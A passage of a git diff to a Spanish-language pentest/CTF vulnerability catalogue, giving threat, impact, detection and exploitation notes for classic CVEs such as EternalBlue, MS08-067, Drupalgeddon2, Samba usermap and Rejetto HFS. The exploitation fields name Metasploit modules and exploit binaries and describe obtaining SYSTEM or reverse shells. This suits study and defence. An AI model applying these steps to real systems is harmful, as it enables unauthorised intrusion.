@@ -55,7 +55,7 @@ order: 2
   </div>
 
   <div class="vb-row vb-search" data-kind="vuln">
-    <span class="vb-label vb-label-vuln">Vulnerabilidad</span>
+    <span class="vb-label vb-label-vuln">Vuln</span>
     <div class="hx-seg">
       <input type="text" id="vb-q-vuln" class="vb-trigger" placeholder="Pincha para elegir vulnerabilidades…" readonly>
       <button type="button" class="hx-opt vb-clear" id="vb-clear" title="Borrar selección" hidden>clear</button>
@@ -117,55 +117,648 @@ order: 2
   Ninguna vulnerabilidad coincide con la búsqueda o el filtro.
 </div>
 
-<!-- Datos de cada CVE para el modal de detalle (misma idea que el bloque JSON de maquinas.html) -->
-<script type="application/json" id="vb-cve-data">
-{
-  "CVE-2010-2861": {"desc":"Salto de directorio en el panel de administración de Adobe ColdFusion 8/9: el parámetro «locale» de varias páginas de /administrator no sanea los «../», lo que permite leer ficheros arbitrarios del servidor sin estar autenticado.","impact":"Lectura de cualquier fichero accesible por el servicio web, incluido el fichero de propiedades con el hash de la contraseña del administrador de ColdFusion.","amenaza":"Con ese hash se entra al panel y desde ahí se despliega código CFM: una simple lectura de ficheros termina en ejecución remota y control del servidor.","solucion":"Aplicar el hotfix de Adobe (APSB10-18), restringir el acceso a /CFIDE/administrator y actualizar a una versión con soporte."},
-  "CVE-2010-2554": {"desc":"Elevación de privilegios local en Windows por una validación insuficiente en un servicio del sistema; se explota con el binario público «Chimichurri».","impact":"Una cuenta de servicio con pocos privilegios (p. ej. la de IIS) pasa a NT AUTHORITY\\SYSTEM.","amenaza":"Tras un RCE web que cae como usuario de servicio, este fallo completa la toma total de la máquina.","solucion":"Aplicar el boletín MS10-059 y mantener el sistema actualizado."},
-  "CVE-2018-7600": {"desc":"Validación insuficiente de entrada en la API de formularios de Drupal 7 y 8 (Drupalgeddon2): ciertos campos con notación especial se renderizan en el servidor, permitiendo inyectar y ejecutar código sin autenticación.","impact":"Ejecución remota de código sin credenciales, con los privilegios del proceso del servidor web.","amenaza":"Explotación trivial y masiva (hubo gusanos y mineros automatizados); un Drupal expuesto y sin parchear se compromete en segundos.","solucion":"Actualizar a Drupal 7.58 / 8.5.1 o superior y revisar si ya hubo compromiso."},
-  "CVE-2017-0144": {"desc":"Desbordamiento en el tratamiento de paquetes SMBv1 del servicio Server de Windows (MS17-010 / EternalBlue): peticiones manipuladas corrompen memoria del kernel y permiten ejecutar código.","impact":"Ejecución remota de código como SYSTEM, sin autenticación, a través de la red.","amenaza":"Es la base de WannaCry y NotPetya: se propaga solo de máquina a máquina por SMB, sin interacción del usuario.","solucion":"Aplicar MS17-010, deshabilitar SMBv1 y filtrar/segmentar el puerto 445."},
-  "CVE-2015-1701": {"desc":"Fallo en win32k.sys que expone una dirección del kernel y permite ejecutar código con privilegios del núcleo desde un proceso de usuario (MS15-051).","impact":"Elevación de un usuario sin privilegios a SYSTEM.","amenaza":"Usado en ataques dirigidos (APT28); convierte cualquier ejecución como usuario en control total del equipo.","solucion":"Aplicar el boletín MS15-051."},
-  "CVE-2017-7269": {"desc":"Desbordamiento de búfer en ScStoragePathFromUrl del componente WebDAV de IIS 6.0, al procesar una cabecera «If» excesivamente larga en una petición PROPFIND.","impact":"Ejecución remota de código sin autenticar en el contexto del servicio web.","amenaza":"IIS 6.0 (Windows Server 2003) ya no tiene soporte: no hay parche oficial, así que todo servidor que siga expuesto es vulnerable de forma permanente.","solucion":"Deshabilitar WebDAV y migrar de IIS 6.0 a una versión con soporte; no existe parche de Microsoft."},
-  "CVE-2007-2447": {"desc":"La opción «username map script» de Samba 3.0.x pasa el nombre de usuario a un shell sin sanearlo; los metacaracteres en el campo de usuario se ejecutan como comandos.","impact":"Ejecución remota de comandos sin autenticación y como root (smbd corre como root).","amenaza":"Explotación fiable y de una sola petición; un Samba antiguo con esa opción activa entrega root directamente.","solucion":"Actualizar Samba a 3.0.25 o superior y no usar «username map script»."},
-  "CVE-2008-4250": {"desc":"Fallo en el manejo de rutas RPC del servicio Server (NetAPI32) de Windows (MS08-067): una petición RPC manipulada corrompe la pila y ejecuta código.","impact":"Ejecución remota de código como SYSTEM, sin autenticación.","amenaza":"El gusano Conficker lo usó para infectar millones de equipos; sigue siendo un clásico contra Windows XP/2003 sin parchear.","solucion":"Aplicar el boletín MS08-067 y retirar los sistemas sin soporte."},
-  "CVE-2018-9276": {"desc":"Inyección de comandos en PRTG Network Monitor anterior a 18.2.39: los parámetros de una notificación de tipo «ejecutar programa» no se sanean y se ejecutan en el sistema.","impact":"Ejecución de comandos con los privilegios del servicio PRTG (habitualmente SYSTEM), requiriendo sesión de administrador.","amenaza":"Las credenciales de PRTG suelen estar por defecto o en los backups de configuración; con ellas, el salto a SYSTEM es inmediato.","solucion":"Actualizar PRTG a 18.2.39 o superior y cambiar las credenciales por defecto."},
-  "CVE-2026-38526": {"desc":"Ejecución remota de código autenticada en Krayin CRM 2.2.x: una funcionalidad de subida no valida el tipo ni la ruta del fichero, permitiendo colocar y ejecutar una webshell.","impact":"Ejecución de comandos como el usuario del servidor web (www-data) con una sesión válida del panel.","amenaza":"Combinado con credenciales filtradas o reutilizadas, entrega el primer punto de apoyo en el servidor.","solucion":"Actualizar Krayin CRM, validar el tipo de fichero y guardar las subidas fuera del directorio web."},
-  "CVE-2014-6287": {"desc":"Rejetto HTTP File Server 2.3x no filtra correctamente una expresión regular del parámetro de búsqueda; una petición con macros permite ejecutar comandos.","impact":"Ejecución remota de código sin autenticar.","amenaza":"Exploit público y muy fiable (habitual en OSCP y CTF); cualquier HFS 2.3 expuesto cae sin credenciales.","solucion":"Actualizar HFS a 2.3e o superior, o retirar el servicio."},
-  "CVE-2016-3309": {"desc":"Fallo en el kernel de Windows que permite elevar privilegios desde un proceso de usuario (MS16-098).","impact":"Elevación de un usuario sin privilegios a SYSTEM.","amenaza":"Escalada local fiable en versiones de Windows sin el parche; cierra la cadena tras un RCE como usuario.","solucion":"Aplicar el boletín MS16-098."},
-  "CVE-2014-6271": {"desc":"Bash evalúa el código que sigue a la definición de funciones exportadas en variables de entorno (Shellshock); cualquier entrada que llegue al entorno de un bash (CGI, DHCP, SSH forzado…) puede ejecutar comandos.","impact":"Ejecución remota de código, normalmente vía scripts CGI de un servidor web, con los privilegios del proceso.","amenaza":"Afectó a infinidad de servidores y dispositivos; explotación trivial con una cabecera HTTP manipulada.","solucion":"Actualizar Bash a las versiones parcheadas de 2014 y revisar los CGIs y servicios que invoquen bash."},
-  "CVE-2014-1812": {"desc":"Las Group Policy Preferences permitían fijar contraseñas (p. ej. del administrador local) guardadas en SYSVOL cifradas con AES, pero Microsoft publicó la clave, así que son descifrables (MS14-025).","impact":"Cualquier usuario del dominio con acceso a SYSVOL descifra esas credenciales, a menudo de cuentas administrativas.","amenaza":"Permite movimiento lateral y escalada en el dominio partiendo de una cuenta cualquiera; clásico del pentest de Active Directory.","solucion":"Aplicar MS14-025, eliminar los cpassword de SYSVOL y usar LAPS para las contraseñas de administrador local."}
-}
-</script>
-
 <script type="application/json" id="vb-vuln-data">
 {
-  "Kerberoasting": {"desc":"Pedir tickets de servicio (TGS) de cuentas con SPN; el ticket va cifrado con el hash de la cuenta de servicio, que se craquea offline.","amenaza":"Cualquier usuario autenticado del dominio puede solicitar esos tickets: escalada clásica en Active Directory sin tocar al controlador.","impact":"Credenciales en claro de cuentas de servicio, a menudo con privilegios altos en el dominio."},
-  "Directory Traversal": {"desc":"Rutas con ../ o absolutas que no se filtran, permitiendo salir del directorio previsto para leer o escribir ficheros arbitrarios.","amenaza":"Según dónde lea o escriba, va de una simple fuga de información a control total de la máquina.","impact":"Lectura de ficheros sensibles o escritura fuera de la carpeta esperada (que puede acabar en RCE o escalada)."},
-  "Abuso de sudo": {"desc":"Reglas de sudo mal puestas: ejecutar un binario como root sin contraseña, o un programa que permite escapar a una shell.","amenaza":"Es la vía de escalada local más habitual en Linux; con GTFOBins casi cualquier binario sudo acaba en una shell de root.","impact":"Ejecución de comandos como root."},
-  "Webshell expuesta en la raíz web": {"desc":"Una webshell (p. ej. phpbash) dejada accesible en el directorio web, sin autenticación.","amenaza":"Punto de entrada directo: quien la encuentra entra sin explotar nada.","impact":"Ejecución de comandos como el usuario del servidor web."},
-  "Tarea cron de root sobre un directorio ajeno": {"desc":"Un cron de root que opera (comodines, scripts) sobre ficheros de un directorio escribible por el usuario.","amenaza":"Escalada fiable y silenciosa: basta con esperar a que salte la tarea.","impact":"Ejecución de código como root cuando se ejecuta el cron."},
-  "Credenciales en claro en un plugin descargable": {"desc":"Un plugin o fichero descargable del servidor contiene credenciales en texto plano.","amenaza":"Mala gestión de secretos: filtra accesos sin necesidad de explotar nada.","impact":"Acceso con esas credenciales a otros servicios o usuarios de la máquina."},
-  "Reutilización de credenciales": {"desc":"La misma contraseña vale para varios servicios o usuarios (base de datos, panel, SSH…).","amenaza":"Cose cadenas enteras: una filtración puntual se convierte en movimiento lateral y escalada.","impact":"Con una sola credencial se encadenan accesos y saltos entre usuarios."},
-  "Subida de ficheros": {"desc":"Un formulario de subida no valida el tipo, la extensión o la ruta, permitiendo colocar un fichero ejecutable (webshell).","amenaza":"De las vías de RCE web más comunes; a menudo basta con una sesión válida.","impact":"Ejecución remota de código como el usuario del servidor web."},
-  "SeImpersonatePrivilege": {"desc":"Una cuenta de servicio con el privilegio SeImpersonate puede suplantar el token de un cliente más privilegiado (familia «Potato»: Juicy, Rogue, Print).","amenaza":"Escalada estándar en servidores Windows (IIS/MSSQL) tras un RCE como cuenta de servicio.","impact":"De la cuenta de servicio a SYSTEM."},
-  "IDOR / Broken Access Control": {"desc":"Referencias directas a objetos (IDs, rutas) sin comprobar permisos, accediendo a datos o funciones de otros usuarios.","amenaza":"Fuga de datos o acciones sensibles sin la autorización adecuada.","impact":"Acceso no autorizado a información o funcionalidades (p. ej. capturas de red ajenas)."},
-  "Capability cap_setuid sobre Python": {"desc":"Un binario (python) con la capability cap_setuid permite cambiar el UID del proceso a 0.","amenaza":"Escalada inmediata: os.setuid(0) y una shell de root.","impact":"Shell como root."},
-  "FTP anónimo": {"desc":"Servicio FTP que permite acceso anónimo, a veces con lectura o escritura sobre rutas sensibles (el webroot, o todo el sistema de ficheros).","amenaza":"Exposición directa: sin credenciales se accede a ficheros o se sube una webshell.","impact":"Lectura de ficheros o subida de código; con escritura sobre el webroot, ejecución remota."},
-  "Credenciales por defecto": {"desc":"Servicios con las credenciales de fábrica o por defecto sin cambiar (Tomcat Manager, dispositivos, paneles…).","amenaza":"Trivial: probar los pares conocidos abre el panel.","impact":"Acceso administrativo al servicio."},
-  "Despliegue de WAR (Tomcat)": {"desc":"El acceso al Tomcat Manager permite desplegar una aplicación WAR maliciosa.","amenaza":"Con credenciales del Manager, RCE en un paso subiendo un WAR; en Windows suele caer como SYSTEM.","impact":"Ejecución de código en el servidor de aplicaciones."},
-  "El servicio corre como SYSTEM": {"desc":"El servicio comprometido (p. ej. Tomcat) se ejecuta con la cuenta SYSTEM/root.","amenaza":"Mala configuración de privilegios: el foothold ya es administrador, sin escalar.","impact":"El RCE del servicio otorga directamente el máximo privilegio."},
-  "Backdoor en PHP 8.1.0-dev (User-Agentt → RCE)": {"desc":"La rama 8.1.0-dev de PHP se publicó con una puerta trasera: una cabecera «User-Agentt» ejecuta código.","amenaza":"Compromiso de la cadena de suministro; explotación trivial con una sola cabecera HTTP.","impact":"Ejecución remota de código sin autenticar."},
-  "SSRF en el «Free File Scanner» de staging": {"desc":"La aplicación hace peticiones a URLs que controla el atacante (Server-Side Request Forgery).","amenaza":"Pivota hacia la red interna y servicios ocultos desde el propio servidor.","impact":"Acceso a servicios internos no expuestos (p. ej. paneles en localhost)."},
-  "AlwaysInstallElevated": {"desc":"Dos políticas de Windows que hacen que los paquetes MSI se instalen con privilegios de SYSTEM para cualquier usuario.","amenaza":"Mala configuración que regala la escalada: un .msi de msfvenom y a SYSTEM.","impact":"De usuario sin privilegios a SYSTEM ejecutando un MSI malicioso."},
-  "Panel de Pi-hole publicado sin autenticación": {"desc":"El panel de administración (Pi-hole) queda accesible sin pedir contraseña.","amenaza":"Exposición directa de una interfaz de administración a cualquiera que la encuentre.","impact":"Control del servicio y, según versión, vías hacia ejecución de comandos."},
-  "Datos borrados recuperables en el disco": {"desc":"Ficheros borrados que siguen presentes en el soporte (USB, disco) y se recuperan con análisis forense.","amenaza":"Mala higiene de datos: lo borrado no desaparece sin un borrado seguro.","impact":"Recuperación de datos sensibles que se creían eliminados."},
-  "Credenciales en los backups de PRTG + patrón predecible": {"desc":"Los backups de configuración de PRTG guardan credenciales, y la contraseña sigue un patrón predecible (basado en el año).","amenaza":"Secretos accesibles en backups: llevan directamente al RCE autenticado del producto.","impact":"Acceso de administrador al panel de PRTG."},
-  "Information Disclosure": {"desc":"El sistema expone información sensible (historial de commits, ficheros, mensajes) que no debería ser pública.","amenaza":"Un secreto subido y luego «borrado» sigue en el historial: puerta a nuevos accesos.","impact":"Filtración de credenciales, rutas o subdominios internos."},
-  "Credenciales débiles y bypass del bloqueo por IP": {"desc":"Contraseñas débiles sumadas a un bloqueo por IP que se evita falseando la cabecera X-Forwarded-For para seguir probando.","amenaza":"El control anti-fuerza-bruta es inservible si se puede falsear la IP de origen.","impact":"Acceso por fuerza bruta al servicio."},
-  "Local File Inclusion (LFI)": {"desc":"Un parámetro incluye ficheros del servidor sin filtrar la ruta.","amenaza":"De una fuga de ficheros a ejecución de código, según lo que se pueda incluir (logs, wrappers).","impact":"Lectura de ficheros sensibles y, combinado con log poisoning o php://filter, RCE."},
-  "Path Traversal y php://filter": {"desc":"Combinación de salto de ruta con los wrappers de PHP (php://filter) para leer o transformar ficheros.","amenaza":"Amplía un LFI para extraer el código fuente y los secretos del servidor.","impact":"Lectura del código fuente y de ficheros sensibles."},
-  "Log Poisoning → RCE": {"desc":"Inyectar código en un log (p. ej. en el User-Agent) y luego incluir ese log mediante un LFI para ejecutarlo.","amenaza":"Convierte una simple inclusión de ficheros en control del servidor.","impact":"Ejecución remota de código."},
-  "Grupo lxd": {"desc":"Pertenecer al grupo lxd permite montar un contenedor con el disco del host y acceder a él como root.","amenaza":"Escalada directa: estar en el grupo lxd equivale a ser root.","impact":"Lectura y escritura del sistema de ficheros del host como root."}
+ "GPP cpassword (MS14-025)": {
+  "ref": "https://nvd.nist.gov/vuln/detail/CVE-2014-1812",
+  "sev": "medium",
+  "intro": "Las Group Policy Preferences guardan contraseñas cifradas con una clave AES que Microsoft publicó, así que son reversibles.",
+  "points": [
+   "El cifrado («cpassword») usa una clave AES-256 documentada por Microsoft.",
+   "Los ficheros Groups.xml viven en SYSVOL, legible por cualquier usuario del dominio.",
+   "Suelen contener la contraseña del administrador local de las máquinas.",
+   "MS14-025 impide crearlas nuevas, pero no borra las ya existentes."
+  ],
+  "amenaza": "Cualquier cuenta del dominio, por insignificante que sea, puede leer SYSVOL y descifrar esas credenciales. Al tratarse a menudo del administrador local replicado por GPO, una sola contraseña abre muchas máquinas. Es un clásico del pentest de Active Directory porque no requiere privilegios previos ni explotar ningún servicio. El atacante pasa de usuario de dominio a administrador local de forma trivial.",
+  "impacto": "La exposición es de credenciales privilegiadas reutilizadas en todo el parque. Con el administrador local se consigue movimiento lateral inmediato y, encadenado con volcado de hashes, escalada en el dominio. El impacto real depende de cuántas máquinas compartan esa contraseña, que suele ser todas. Es información directamente accionable, sin crackeo intermedio.",
+  "rec": "Buscar ficheros Groups.xml (u otros *.xml de Preferences) en el recurso SYSVOL del controlador de dominio con un atributo «cpassword».",
+  "conf": "Localizar la cadena cpassword en el XML; su presencia ya confirma el fallo.",
+  "expl": "Descifrarla con gpp-decrypt (<code>gpp-decrypt &lt;cpassword&gt;</code>) o el módulo de Metasploit smb_enum_gpp; la contraseña sale en claro."
+ },
+ "Escalada local MS10-059 (Chimichurri)": {
+  "ref": "https://nvd.nist.gov/vuln/detail/CVE-2010-2554",
+  "sev": "high",
+  "intro": "Elevación de privilegios local en Windows por un fallo en el servicio de seguimiento (tracing), explotada con el binario «Chimichurri».",
+  "points": [
+   "Afecta a Windows Vista/7/2008 sin el parche MS10-059.",
+   "El exploit público «Chimichurri» abre una shell reversa como SYSTEM.",
+   "Requiere ejecución previa como un usuario con pocos privilegios.",
+   "No necesita interacción adicional: se lanza y devuelve SYSTEM."
+  ],
+  "amenaza": "Tras un RCE web que cae como cuenta de servicio (p. ej. la de IIS), este fallo cierra la cadena hasta SYSTEM. Es fiable y rápido, lo que lo hace muy usado en laboratorios y en equipos antiguos sin parchear. El atacante no necesita credenciales adicionales, solo poder ejecutar el binario. La escalada es local pero total.",
+  "impacto": "El resultado es control administrativo completo del equipo. Desde SYSTEM se vuelcan hashes, se crean usuarios y se persiste. En un dominio, esa máquina pasa a ser un punto de pivote de confianza. El impacto es la toma total del host.",
+  "rec": "Identificar la versión de Windows y los parches instalados (<code>systeminfo</code>) y cruzarlos con MS10-059.",
+  "conf": "Comprobar que el sistema no tiene el parche; herramientas como Watson/Sherlock lo señalan.",
+  "expl": "Subir Chimichurri.exe, arrancar un listener y ejecutar <code>Chimichurri.exe &lt;IP&gt; &lt;puerto&gt;</code> para recibir shell como SYSTEM."
+ },
+ "Drupalgeddon2 — RCE sin autenticar en Drupal 7": {
+  "ref": "https://nvd.nist.gov/vuln/detail/CVE-2018-7600",
+  "sev": "critical",
+  "intro": "Validación insuficiente en la API de formularios de Drupal 7/8 que permite ejecutar código sin autenticación (Drupalgeddon2).",
+  "points": [
+   "Entra por campos con notación especial (#) que Drupal renderiza en servidor.",
+   "No requiere credenciales ni interacción de un usuario.",
+   "Afecta a Drupal < 7.58 y < 8.5.1.",
+   "Hubo explotación masiva y automatizada (mineros, botnets)."
+  ],
+  "amenaza": "Es un RCE preautenticación sobre un CMS muy extendido, con exploits públicos y fiables. Cualquier Drupal expuesto y sin parchear se compromete en segundos, por lo que fue objeto de campañas automatizadas a gran escala. No hace falta ninguna cuenta ni acción de la víctima. El riesgo es inmediato en cuanto el servicio es accesible.",
+  "impacto": "El atacante ejecuta comandos con los privilegios del servidor web y toma el sitio. Desde ahí lee la base de datos, roba credenciales y pivota a la máquina. La integridad y confidencialidad del sitio quedan comprometidas por completo. Suele ser el primer punto de apoyo en la máquina.",
+  "rec": "Detectar Drupal (CHANGELOG.txt, cabeceras X-Generator) y estimar la versión.",
+  "conf": "Lanzar una prueba inocua del exploit (p. ej. que el servidor ejecute <code>id</code>) y ver la salida.",
+  "expl": "Usar un PoC de Drupalgeddon2 contra <code>/user/register</code> para ejecutar comandos y lanzar una reverse shell."
+ },
+ "MS17-010 / EternalBlue": {
+  "ref": "https://nvd.nist.gov/vuln/detail/CVE-2017-0144",
+  "sev": "critical",
+  "intro": "Desbordamiento en el tratamiento de paquetes SMBv1 del servicio Server de Windows (MS17-010 / EternalBlue).",
+  "points": [
+   "Explotable en remoto y sin autenticación sobre el puerto 445.",
+   "Corrompe memoria del kernel para ejecutar código como SYSTEM.",
+   "Base de los gusanos WannaCry y NotPetya.",
+   "Afecta a Windows sin el parche MS17-010 (XP a 2016)."
+  ],
+  "amenaza": "Es un RCE remoto preautenticación a nivel de kernel, con capacidad de gusano. Se propaga solo de máquina a máquina por SMB, sin que ningún usuario haga nada. Un host con SMBv1 expuesto cae de inmediato y puede arrastrar a toda la red. Fue una de las amenazas más destructivas de la década.",
+  "impacto": "La ejecución es como SYSTEM, es decir, control total del equipo desde el primer momento. Permite desplegar ransomware, robar credenciales y moverse lateralmente. En redes planas, una sola máquina vulnerable compromete el dominio. El impacto es crítico tanto en confidencialidad como en disponibilidad.",
+  "rec": "Escanear el 445 y detectar SMBv1 (nmap <code>--script smb-protocols</code>).",
+  "conf": "Confirmar con <code>nmap --script smb-vuln-ms17-010</code>, que marca el host como vulnerable.",
+  "expl": "Lanzar el módulo de Metasploit <code>exploit/windows/smb/ms17_010_eternalblue</code> (o scripts standalone) para shell como SYSTEM."
+ },
+ "Escalada local MS15-051": {
+  "ref": "https://nvd.nist.gov/vuln/detail/CVE-2015-1701",
+  "sev": "high",
+  "intro": "Fallo en win32k.sys que expone una dirección del kernel y permite ejecutar código con privilegios del núcleo (MS15-051).",
+  "points": [
+   "Afecta a Windows 7/2008/2012 sin el parche MS15-051.",
+   "Exploits públicos y binarios precompilados (ms15-051x64.exe).",
+   "Convierte una ejecución como usuario en SYSTEM.",
+   "Usado en ataques dirigidos (APT28)."
+  ],
+  "amenaza": "Es una escalada local muy fiable para Windows sin parchear, con binarios listos para usar. Cierra la cadena tras un RCE que cae como usuario de pocos privilegios. No requiere nada más que ejecutar el binario. Por su fiabilidad es de las primeras que se prueban en pentest.",
+  "impacto": "Da control administrativo completo (SYSTEM) del equipo. Desde ahí se vuelcan hashes y se persiste. En dominio, convierte la máquina en pivote de confianza. El impacto es la toma total del host.",
+  "rec": "Enumerar versión y parches (<code>systeminfo</code>) y cruzar con MS15-051.",
+  "conf": "Confirmar la ausencia del parche con Sherlock/Watson/WES.",
+  "expl": "Ejecutar <code>ms15-051x64.exe \"whoami\"</code> o lanzar un comando para abrir shell como SYSTEM."
+ },
+ "Buffer Overflow en el WebDAV de IIS 6.0": {
+  "ref": "https://nvd.nist.gov/vuln/detail/CVE-2017-7269",
+  "sev": "critical",
+  "intro": "Desbordamiento de búfer en ScStoragePathFromUrl del WebDAV de IIS 6.0 al procesar una cabecera «If» muy larga.",
+  "points": [
+   "Afecta a IIS 6.0 (Windows Server 2003), producto sin soporte.",
+   "Se dispara con una petición PROPFIND manipulada.",
+   "RCE remoto sin autenticar.",
+   "No existe parche oficial de Microsoft."
+  ],
+  "amenaza": "Al no tener soporte, cualquier IIS 6.0 expuesto es vulnerable de forma permanente. Es un RCE remoto preautenticación con exploits públicos. No hay forma oficial de parchearlo, solo mitigar o migrar. El riesgo persiste mientras el servicio siga accesible.",
+  "impacto": "La ejecución ocurre en el contexto del servicio IIS, habitualmente un usuario de servicio. Desde ahí se enumera y se escala (típicamente por abuso de tokens) hasta SYSTEM. Compromete la confidencialidad e integridad del servidor. Suele ser el foothold de la máquina.",
+  "rec": "Detectar IIS 6.0 (cabecera Server) y que WebDAV está activo (verbos PROPFIND/OPTIONS).",
+  "conf": "Comprobar con <code>davtest</code> o nmap que WebDAV responde.",
+  "expl": "Usar el exploit público de CVE-2017-7269 (p. ej. el script de Python de ExploitDB) apuntando a tu IP/puerto para recibir shell."
+ },
+ "Samba «username map script»": {
+  "ref": "https://nvd.nist.gov/vuln/detail/CVE-2007-2447",
+  "sev": "critical",
+  "intro": "Inyección de comandos en la opción «username map script» de Samba 3.0.x: el nombre de usuario se pasa a un shell sin sanear.",
+  "points": [
+   "Afecta a Samba 3.0.0–3.0.25rc3 con «username map script» configurado.",
+   "Metacaracteres en el campo de usuario se ejecutan como comandos.",
+   "No requiere autenticación.",
+   "El proceso smbd corre como root."
+  ],
+  "amenaza": "Es un RCE remoto preautenticación que entrega root en una sola petición. El exploit es trivial y muy fiable, de ahí su fama en CTF y OSCP. Basta con que el servicio tenga esa opción activa. El riesgo es inmediato si el Samba es accesible.",
+  "impacto": "La ejecución es directamente como root, es decir, control total de la máquina. No hay fase de escalada: el foothold ya es administrador. Compromete confidencialidad, integridad y disponibilidad. Es una de las vías más limpias a root.",
+  "rec": "Detectar Samba y su versión (<code>smbclient</code>, nmap <code>smb-os-discovery</code>, enum4linux).",
+  "conf": "Comprobar que la versión cae en el rango vulnerable (3.0.20–3.0.25rc3).",
+  "expl": "Usar el módulo <code>exploit/multi/samba/usermap_script</code> de Metasploit o inyectar el payload en el campo usuario con smbclient."
+ },
+ "MS08-067 (NetAPI)": {
+  "ref": "https://nvd.nist.gov/vuln/detail/CVE-2008-4250",
+  "sev": "critical",
+  "intro": "Fallo en el manejo de rutas RPC del servicio Server (NetAPI32) de Windows que permite RCE sin autenticación (MS08-067).",
+  "points": [
+   "Afecta a Windows 2000/XP/2003 sin el parche MS08-067.",
+   "Una petición RPC manipulada corrompe la pila.",
+   "Ejecución como SYSTEM, en remoto y sin credenciales.",
+   "Lo usó el gusano Conficker para infectar millones de equipos."
+  ],
+  "amenaza": "Es un RCE remoto preautenticación histórico, con exploits ultrafiables. Afecta a sistemas antiguos que todavía aparecen en entornos industriales y legacy. Un host XP/2003 sin parchear cae sin interacción. El riesgo es inmediato en cuanto el 445 es accesible.",
+  "impacto": "La ejecución es como SYSTEM: control total del equipo. Permite volcado de credenciales, persistencia y pivote. En redes planas compromete el dominio. El impacto es crítico.",
+  "rec": "Identificar Windows XP/2003 por fingerprinting (nmap <code>smb-os-discovery</code>).",
+  "conf": "Confirmar con <code>nmap --script smb-vuln-ms08-067</code>.",
+  "expl": "Lanzar <code>exploit/windows/smb/ms08_067_netapi</code> en Metasploit eligiendo el target correcto por versión/idioma."
+ },
+ "RCE autenticado en PRTG 18.1.37": {
+  "ref": "https://nvd.nist.gov/vuln/detail/CVE-2018-9276",
+  "sev": "high",
+  "intro": "Inyección de comandos autenticada en PRTG Network Monitor < 18.2.39 a través de las notificaciones de tipo «ejecutar programa».",
+  "points": [
+   "Requiere una sesión de administrador en PRTG.",
+   "Los parámetros de la notificación no se sanean.",
+   "Los comandos se ejecutan con los privilegios del servicio.",
+   "Las credenciales suelen estar en backups o por defecto."
+  ],
+  "amenaza": "Aunque es autenticado, las credenciales de PRTG suelen conseguirse fácil (backups de configuración, patrones predecibles, valores por defecto). Con ellas, el salto a ejecución de comandos es directo. El servicio corre con privilegios altos, así que el RCE suele ser ya administrativo. El riesgo real es alto porque la barrera de autenticación es débil.",
+  "impacto": "La ejecución ocurre como la cuenta del servicio PRTG, habitualmente SYSTEM. Eso da control total del servidor de monitorización, que suele tener visibilidad de toda la red. Compromete credenciales y datos de monitorización. Es a la vez foothold y escalada.",
+  "rec": "Detectar PRTG y su versión en el panel web (login /index.htm, footer).",
+  "conf": "Conseguir una sesión de admin (credenciales de backups/por defecto) y localizar la sección de notificaciones.",
+  "expl": "Crear una notificación «ejecutar programa» con un parámetro que lance tu comando (p. ej. crear un usuario admin) y dispararla."
+ },
+ "RCE autenticado en Krayin CRM 2.2.0": {
+  "ref": "https://nvd.nist.gov/vuln/detail/CVE-2026-38526",
+  "sev": "high",
+  "intro": "RCE autenticado en Krayin CRM 2.2.x: una funcionalidad de subida no valida tipo ni ruta, permitiendo colocar y ejecutar una webshell.",
+  "points": [
+   "Requiere una sesión válida del panel de Krayin.",
+   "La subida acepta ficheros ejecutables en una ruta accesible.",
+   "Se ejecuta como el usuario del servidor web (www-data).",
+   "Se encadena con credenciales filtradas o reutilizadas."
+  ],
+  "amenaza": "La barrera de autenticación cae fácil cuando hay credenciales reutilizadas o filtradas, algo habitual. Con sesión válida, subir y ejecutar una webshell es directo. Da el primer punto de apoyo en el servidor. El riesgo es alto en despliegues con malas prácticas de credenciales.",
+  "impacto": "La ejecución es como www-data, suficiente para enumerar internamente y preparar la escalada. Compromete la aplicación y los datos del CRM. Suele ser el foothold de la máquina. El impacto se amplifica si hay reutilización de credenciales hacia otros usuarios.",
+  "rec": "Identificar Krayin CRM y su versión (panel /admin/login, assets).",
+  "conf": "Entrar con credenciales válidas y localizar la funcionalidad de subida vulnerable.",
+  "expl": "Subir una webshell PHP y navegar a su ruta, o usar el PoC público de CVE-2026-38526 para obtener reverse shell."
+ },
+ "RCE en Rejetto HFS 2.3": {
+  "ref": "https://nvd.nist.gov/vuln/detail/CVE-2014-6287",
+  "sev": "critical",
+  "intro": "Rejetto HTTP File Server 2.3x no filtra bien una expresión regular del parámetro de búsqueda, permitiendo ejecutar comandos.",
+  "points": [
+   "Afecta a HFS 2.3x (y versiones anteriores).",
+   "Se explota con macros (%00, {.exec.}) en la URL.",
+   "RCE remoto sin autenticar.",
+   "Exploit público muy fiable."
+  ],
+  "amenaza": "Es un RCE remoto preautenticación con exploits de una sola petición, muy usado en OSCP y CTF. Cualquier HFS 2.3 expuesto cae sin credenciales. La explotación es rápida y estable. El riesgo es inmediato si el servicio es accesible.",
+  "impacto": "La ejecución ocurre con los privilegios del proceso HFS, a menudo un usuario de pocos permisos en Windows. Desde ahí se escala (abuso de tokens, exploits locales) hasta SYSTEM. Compromete el servidor de ficheros. Suele ser el foothold de la máquina.",
+  "rec": "Detectar HFS por el banner/título «HttpFileServer» y la versión 2.3.",
+  "conf": "Probar una macro inocua en el parámetro de búsqueda y ver si se ejecuta.",
+  "expl": "Usar el exploit de CVE-2014-6287 (ExploitDB 39161) para descargar y ejecutar nc y recibir shell."
+ },
+ "Escalada local MS16-098": {
+  "ref": "https://nvd.nist.gov/vuln/detail/CVE-2016-3309",
+  "sev": "high",
+  "intro": "Fallo en el kernel de Windows (win32k) que permite elevar privilegios desde un proceso de usuario (MS16-098).",
+  "points": [
+   "Afecta a Windows 8.1/2012 R2 sin el parche MS16-098.",
+   "Binarios de exploit públicos y fiables.",
+   "Convierte usuario en SYSTEM.",
+   "Escalada local, requiere ejecución previa."
+  ],
+  "amenaza": "Es una escalada local fiable para Windows sin parchear, con binarios listos. Cierra la cadena tras un RCE como usuario. No requiere credenciales adicionales. Por su fiabilidad es de las primeras opciones en pentest.",
+  "impacto": "Da SYSTEM: control administrativo completo. Permite volcado de hashes y persistencia. Convierte la máquina en pivote. El impacto es la toma total del host.",
+  "rec": "Enumerar versión y parches (<code>systeminfo</code>) y cruzar con MS16-098.",
+  "conf": "Confirmar la ausencia del parche con WES/Watson.",
+  "expl": "Ejecutar el binario de MS16-098 que lanza un comando como SYSTEM o abre una shell."
+ },
+ "Shellshock": {
+  "ref": "https://nvd.nist.gov/vuln/detail/CVE-2014-6271",
+  "sev": "critical",
+  "intro": "Bash ejecuta el código que sigue a funciones exportadas en variables de entorno (Shellshock); cualquier entrada que llegue al entorno de bash ejecuta comandos.",
+  "points": [
